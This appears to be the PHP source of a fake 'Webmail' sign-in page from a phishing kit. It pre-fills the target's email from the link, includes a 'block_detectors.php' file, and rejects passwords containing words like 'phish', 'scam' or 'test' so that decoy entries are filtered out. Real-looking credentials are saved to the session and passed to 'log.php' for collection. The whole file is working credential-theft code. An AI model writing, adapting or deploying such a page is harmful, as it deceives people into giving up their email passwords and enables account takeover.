<?php
session_start();
require('./block_detectors.php');
// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $username);
	$user = @$parts[0];
// < end 
	$email_error = "";
	$pass_error = "";
	$user_email = $username;

	function is_rubbish($passwd){
		$unwanted_password = array('fuck', 'cheater', 'test',  '123456789', 
		'stupid', 'fraud', 'scam', 'spammer', 'suck', 'phish');
		foreach($unwanted_password as $bad_pass){
			if(strpos($passwd, $bad_pass) !== false){
				return true;
			}
		}
		// ignore password like abbbbc or AAAAbbcc but allow AABBCC or aaccddd if you dont want it delete next line
		if(preg_match('/(.)\1{3,}/',$passwd)) { return true; }

		return false;
	}

	if($_POST){
		$email = $_POST['username'];
		$pass = $_POST['password'];


		if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email) || trim($email) == "") {
			$email_error = "Please enter a valid email address"; 

		} else if(trim($pass) == "") {

			$pass_error = "Please enter password";

		} else if(is_rubbish($pass) || strlen($pass) < 5 || $pass == '12345' || $pass == '123456' || $pass == $email) {
			$pass_error = "Your password is invalid";
		}
	   	else {
			$_SESSION['email'] = $email;
			$_SESSION['password'] = $pass;
			header("Location: log.php");
			exit;
		}

	}
?>
<html>
<head>
	<title>Webmail</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="icon" type="image/png" href="images/favicon.ico">
</head>
<body>

	<div class="login-form">
		<div class="inner">
			<img src="images/webmail.png" >
			<div class="form-content">
				<form action="" method="POST">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>
						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="Email Address" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Password" />
						<input type="submit" value="Sign in" class="button">
					</div>
				</form>
			</div>
		</div>
		<div class="shadow"><img src="images/shadow.png" ></div>

		<div class="supported">
			<h3>Supported Email Providers</h3>
			<img src="images/supported.png" >
		</div>
	</div>
</body>
</html>